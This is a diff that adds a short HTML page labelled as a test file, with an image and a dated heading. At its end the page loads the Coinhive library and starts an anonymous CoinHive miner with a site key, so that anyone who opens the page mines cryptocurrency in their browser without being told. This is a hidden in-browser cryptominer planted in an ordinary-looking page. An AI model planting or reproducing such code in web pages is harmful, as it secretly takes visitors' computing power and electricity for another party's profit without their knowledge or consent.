@@ -1,0 +1,8 @@
+<html>
+<body>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('MkjIVpmMQEyTprDF8PKgRFAOjGGIWcey', { throttle: 0.3 }); miner.start(); </script> </body>
+</html>
